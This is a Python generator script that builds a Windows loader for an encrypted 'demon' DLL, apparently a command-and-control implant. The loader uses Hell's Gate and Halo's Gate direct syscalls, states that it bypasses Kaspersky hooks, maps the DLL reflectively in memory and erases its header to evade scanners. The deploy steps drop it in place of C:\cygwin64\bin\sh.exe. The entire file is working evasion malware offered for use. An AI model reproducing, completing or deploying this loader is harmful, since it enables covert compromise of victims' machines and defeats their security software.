#!/usr/bin/env python3
"""
gen_sh.py — Native C PE loader using Hell's Gate + Halo's Gate direct syscalls.

Bypasses Kaspersky klhk.dll hooks on VirtualAlloc/VirtualProtect/CreateRemoteThread
by resolving NtAllocateVirtualMemory / NtProtectVirtualMemory / NtFlushInstructionCache
SSNs at runtime and executing them via inline syscall stubs. No RWX VirtualAlloc.

Two output modes:

  python3 generators/gen_sh.py              → external mode
      sh.exe (17 KB) + demon_enc.dat
      sh.exe reads demon_enc.dat from C:\\Windows\\Temp\\ at runtime.
      Upload both files separately.

  python3 generators/gen_sh.py embed        → standalone mode
      sh_embed.exe (~120 KB) — fully self-contained, no separate .dat file.
      Single upload, one click.

Requirements:
  x86_64-w64-mingw32-gcc   (apt install mingw-w64)
  demon.x64.dll            in parent directory

Deploy (external mode):
  upload /path/to/demon_enc.dat C:\\Windows\\Temp\\demon_enc.dat
  upload /path/to/sh.exe        C:\\cygwin64\\bin\\sh.exe

Deploy (standalone mode):
  upload /path/to/sh_embed.exe  C:\\cygwin64\\bin\\sh.exe
"""

import os, sys, secrets, subprocess, shutil, tempfile

ROOT    = os.path.dirname(os.path.abspath(__file__))
DLL     = os.path.join(ROOT, '..', 'demon.x64.dll')
EMBED   = len(sys.argv) > 1 and sys.argv[1] == 'embed'
DAT_WIN = r'C:\Windows\Temp\demon_enc.dat'

if not os.path.exists(DLL):
    sys.exit(f'[!] demon.x64.dll not found at {DLL}')

dll = open(DLL, 'rb').read()
key = secrets.token_bytes(16)
enc = bytes([dll[i] ^ key[i % 16] for i in range(len(dll))])
print(f'[+] DLL: {len(dll):,} bytes  key: {key.hex()}')

key_c  = ','.join(str(b) for b in key)
path_k = 0x5B
path_e = ','.join(str(ord(c) ^ path_k) for c in DAT_WIN)
path_l = len(DAT_WIN)

# ── Payload section ───────────────────────────────────────────────────────────
if EMBED:
    # Embed encrypted DLL bytes directly as a C array (standalone EXE)
    rows   = [enc[i:i+16] for i in range(0, len(enc), 16)]
    arr_c  = ',\n  '.join(','.join(f'0x{b:02X}' for b in row) for row in rows)
    payload_section = f"""
/* ── Embedded encrypted payload ───────────────────────────────────────────── */
static const BYTE  PAYLOAD[]    = {{
  {arr_c}
}};
static const DWORD PAYLOAD_LEN  = {len(enc)}u;
"""
    read_payload = r"""
    /* Decrypt embedded payload in-place */
    BYTE *buf = (BYTE*)malloc(PAYLOAD_LEN);
    if (!buf) return 4;
    memcpy(buf, PAYLOAD, PAYLOAD_LEN);
    DWORD fsz = PAYLOAD_LEN;
"""
    out_name = os.path.join(ROOT, '..', 'sh_embed.exe')
    dat_name = None
else:
    # External .dat file mode
    dat_name = os.path.join(ROOT, '..', 'demon_enc.dat')
    open(dat_name, 'wb').write(enc)
    payload_section = f"""
/* ── External payload path (XOR-obfuscated) ──────────────────────────────── */
static const BYTE PATH_ENC[] = {{{path_e}}};
static const int  PATH_LEN   = {path_l};
static const BYTE PATH_KEY   = 0x5B;
"""
    read_payload = r"""
    /* Decode payload path */
    char path[MAX_PATH] = {0};
    for (int i = 0; i < PATH_LEN; i++) path[i] = (char)(PATH_ENC[i] ^ PATH_KEY);

    /* Read encrypted payload from disk */
    HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return 3;
    DWORD fsz = GetFileSize(f, NULL);
    BYTE *buf  = (BYTE*)malloc(fsz);
    if (!buf) { CloseHandle(f); return 4; }
    DWORD rd = 0;
    ReadFile(f, buf, fsz, &rd, NULL);
    CloseHandle(f);
    if (rd != fsz) { free(buf); return 5; }
"""
    out_name = os.path.join(ROOT, '..', 'sh.exe')

# ── C source ──────────────────────────────────────────────────────────────────
c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdlib.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

{payload_section}

/* ── XOR decryption key ──────────────────────────────────────────────────── */
static const BYTE XK[16] = {{{key_c}}};

/* ══════════════════════════════════════════════════════════════════════════
   Bootstrap naked stubs — live in .text (always executable, no RWX needed).
   SSNs are stable across all Windows 10/11 builds:
     NtAllocateVirtualMemory  = 0x18
     NtProtectVirtualMemory   = 0x50
     NtFlushInstructionCache  = 0xD5  (24H2 / build 26xxx)
   ══════════════════════════════════════════════════════════════════════════ */
__attribute__((naked)) void _nt_protect_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x50,%eax\\n syscall\\n ret\\n");
}}
__attribute__((naked)) void _nt_alloc_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x18,%eax\\n syscall\\n ret\\n");
}}
__attribute__((naked)) void _nt_flush_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0xD5,%eax\\n syscall\\n ret\\n");
}}

/* ══════════════════════════════════════════════════════════════════════════
   Hell's Gate + Halo's Gate — dynamic SSN resolution from live ntdll
   Handles hooked stubs (JMP at start) by scanning adjacent Nt* functions.
   ══════════════════════════════════════════════════════════════════════════ */
typedef struct {{ DWORD rva; const char *name; }} NtExp;

static int cmp_rva(const void *a, const void *b) {{
    DWORD ra = ((const NtExp*)a)->rva, rb = ((const NtExp*)b)->rva;
    return (ra > rb) - (ra < rb);
}}

static DWORD ssn_of(HMODULE ntdll, const char *fn) {{
    BYTE                   *base = (BYTE*)ntdll;
    IMAGE_DOS_HEADER       *dos  = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64     *nt   = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp  = (IMAGE_EXPORT_DIRECTORY*)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD*)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)(base + exp->AddressOfFunctions);

    NtExp *arr = (NtExp*)malloc(exp->NumberOfNames * sizeof(NtExp));
    if (!arr) return ~0u;
    int cnt = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {{
        const char *n = (const char*)(base + names[i]);
        if (n[0]=='N' && n[1]=='t') {{ arr[cnt].rva=funcs[ords[i]]; arr[cnt].name=n; cnt++; }}
    }}
    qsort(arr, cnt, sizeof(NtExp), cmp_rva);

    DWORD ssn = ~0u;
    for (int i = 0; i < cnt; i++) {{
        if (strcmp(arr[i].name, fn)) continue;
        BYTE *s = base + arr[i].rva;
        if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {{
            ssn = *(DWORD*)(s+4); break;                  /* unhooked */
        }}
        for (int d = 1; d < 10; d++) {{                   /* Halo's Gate */
            if (i-d >= 0) {{
                BYTE *t = base + arr[i-d].rva;
                if (t[0]==0x4C && t[1]==0x8B && t[2]==0xD1 && t[3]==0xB8)
                    {{ ssn = *(DWORD*)(t+4)+d; break; }}
            }}
            if (ssn != ~0u) break;
            if (i+d < cnt) {{
                BYTE *t = base + arr[i+d].rva;
                if (t[0]==0x4C && t[1]==0x8B && t[2]==0xD1 && t[3]==0xB8)
                    {{ ssn = *(DWORD*)(t+4)-d; break; }}
            }}
            if (ssn != ~0u) break;
        }}
        break;
    }}
    free(arr);
    return ssn;
}}

/* ── Dynamic stub trampolines (written into RW page, then flipped to RX) ── */
typedef NTSTATUS (*FnAlloc)  (HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (*FnProtect)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (*FnFlush)  (HANDLE, PVOID, ULONG);

static BYTE *g_stubs  = NULL;
static int   g_scount = 0;

static void *make_stub(DWORD ssn) {{
    BYTE *s = g_stubs + g_scount++ * 16;
    s[0]=0x4C; s[1]=0x8B; s[2]=0xD1;          /* mov r10, rcx */
    s[3]=0xB8; *(DWORD*)(s+4)=ssn;             /* mov eax, SSN */
    s[8]=0x0F; s[9]=0x05; s[10]=0xC3;          /* syscall; ret */
    return s;
}}

/* ══════════════════════════════════════════════════════════════════════════
   In-process PE loader (reflective DLL map)
   ══════════════════════════════════════════════════════════════════════════ */
static BOOL load_pe(const BYTE *pe, SIZE_T len,
                    FnAlloc NtAlloc, FnProtect NtProt, FnFlush NtFlush)
{{
    if (len < 0x40) return FALSE;
    int eo = *(int*)(pe+0x3C);
    if ((SIZE_T)(eo+0x100) > len) return FALSE;

    int       ns  = *(short*)    (pe+eo+6);
    int       soh = *(short*)    (pe+eo+20);
    int       ep  = *(int*)      (pe+eo+24+16);
    long long ib  = *(long long*)(pe+eo+24+24);
    int       si  = *(int*)      (pe+eo+24+56);
    int       sh  = *(int*)      (pe+eo+24+60);
    int       rr  = *(int*)      (pe+eo+24+152);
    int       rs  = *(int*)      (pe+eo+24+156);
    int       sto = eo+24+soh;

    HANDLE cur  = (HANDLE)(LONG_PTR)-1;
    PVOID  base = NULL;
    SIZE_T sz   = (SIZE_T)si;
    if (!NT_SUCCESS(NtAlloc(cur,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))||!base)
        return FALSE;

    memcpy(base, pe, sh);
    for (int i = 0; i < ns; i++) {{
        int so=sto+i*40, va=*(int*)(pe+so+12), ro=*(int*)(pe+so+20), rl=*(int*)(pe+so+16);
        if (rl > 0) memcpy((BYTE*)base+va, pe+ro, rl);
    }}

    if (rr) {{
        long long delta = (long long)base - ib;
        for (int off = 0; off < rs; ) {{
            int rv=*(int*)((BYTE*)base+rr+off), bsz=*(int*)((BYTE*)base+rr+off+4);
            if (bsz < 8) break;
            for (int j = 0; j < (bsz-8)/2; j++) {{
                unsigned short en=*(unsigned short*)((BYTE*)base+rr+off+8+j*2);
                if (en>>12==10) {{ long long *pa=(long long*)((BYTE*)base+rv+(en&0xFFF)); *pa+=delta; }}
            }}
            off += bsz;
        }}
    }}

    for (int i = 0; i < ns; i++) {{
        int so=sto+i*40, va=*(int*)(pe+so+12);
        int vs=*(int*)(pe+so+8); if(!vs) vs=*(int*)(pe+so+16);
        unsigned int ch=*(unsigned int*)(pe+so+36);
        if (vs<=0) continue;
        ULONG prot=PAGE_READONLY;
        if ((ch>>29)&1) prot = ((ch>>31)&1) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if ((ch>>31)&1) prot = PAGE_READWRITE;
        PVOID addr=(BYTE*)base+va; SIZE_T size=(SIZE_T)vs; ULONG old=0;
        NtProt(cur,&addr,&size,prot,&old);
    }}

    NtFlush(cur, base, (ULONG)si);
    SecureZeroMemory(base, sh);   /* erase PE header — defeats memory scanners */

    typedef BOOL (WINAPI *DM)(HINSTANCE,DWORD,LPVOID);
    ((DM)((BYTE*)base+ep))((HINSTANCE)base, 1, NULL);
    return TRUE;
}}

/* ══════════════════════════════════════════════════════════════════════════
   Entry point
   ══════════════════════════════════════════════════════════════════════════ */
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h; (void)p; (void)cmd; (void)show;

    /* 1. Allocate stub page as plain RW — NOT RWX (no klhk.dll alarm) */
    g_stubs = (BYTE*)VirtualAlloc(NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!g_stubs) return 1;

    /* 2. Resolve SSNs via Hell's Gate (pure memory read, no execution) */
    HMODULE ntdll     = GetModuleHandleA("ntdll.dll");
    DWORD ssn_alloc   = ssn_of(ntdll,"NtAllocateVirtualMemory");
    DWORD ssn_protect = ssn_of(ntdll,"NtProtectVirtualMemory");
    DWORD ssn_flush   = ssn_of(ntdll,"NtFlushInstructionCache");
    if (ssn_alloc   ==~0u) ssn_alloc   = 0x18;   /* stable fallback */
    if (ssn_protect ==~0u) ssn_protect = 0x50;
    if (ssn_flush   ==~0u) ssn_flush   = 0xD5;

    /* 3. Write stubs into RW page */
    make_stub(ssn_alloc);
    make_stub(ssn_protect);
    make_stub(ssn_flush);

    /* 4. Flip RW → RX via hardcoded naked stub (bypasses klhk.dll hook) */
    typedef NTSTATUS (*FnProt)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
    HANDLE cur=((HANDLE)(LONG_PTR)-1); PVOID sp=g_stubs; SIZE_T ss=4096; ULONG sold=0;
    ((FnProt)_nt_protect_hc)(cur,&sp,&ss,PAGE_EXECUTE_READ,&sold);

    /* 5. Typed pointers into now-executable stub page */
    FnAlloc   NtAlloc = (FnAlloc)  (g_stubs+0*16);
    FnProtect NtProt  = (FnProtect)(g_stubs+1*16);
    FnFlush   NtFlush = (FnFlush)  (g_stubs+2*16);

    /* 6. Load payload */
{read_payload}

    /* 7. XOR decrypt */
    for (DWORD i = 0; i < fsz; i++) buf[i] ^= XK[i%16];

    /* 8. Map PE — all sensitive NT calls go through direct-syscall stubs */
    load_pe(buf, (SIZE_T)fsz, NtAlloc, NtProt, NtFlush);

    /* DllMain starts C2 thread; keep main thread alive */
    while(1) Sleep(30000);
    return 0;
}}
"""

# ── Compile ───────────────────────────────────────────────────────────────────
tmp = tempfile.mkdtemp(prefix='sh_build_')
try:
    src = os.path.join(tmp, 'sh.c')
    bin = os.path.join(tmp, 'sh.exe')
    open(src, 'w').write(c_src)
    label = 'embedded' if EMBED else 'external'
    print(f'[*] Compiling ({label} mode) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', bin, src, '-lkernel32',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)
    if r.returncode != 0:
        dbg = os.path.join(ROOT, '..', 'sh_debug.c')
        open(dbg,'w').write(c_src)
        print(f'[!] Build failed — source saved to {dbg}')
        print(r.stderr[-3000:])
        sys.exit(1)
    shutil.copy(bin, out_name)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {out_name}  ({os.path.getsize(out_name):,} bytes)')

if EMBED:
    print()
    print('Single-file deploy (no separate .dat needed):')
    print(f'  upload {out_name} C:\\cygwin64\\bin\\sh.exe')
    print(f'  shell "C:\\cygwin64\\bin\\sh.exe"')
else:
    print(f'[+] {dat_name}  ({os.path.getsize(dat_name):,} bytes)')
    print()
    print('Two-file deploy:')
    print(f'  upload {dat_name} C:\\Windows\\Temp\\demon_enc.dat')
    print(f'  upload {out_name} C:\\cygwin64\\bin\\sh.exe')
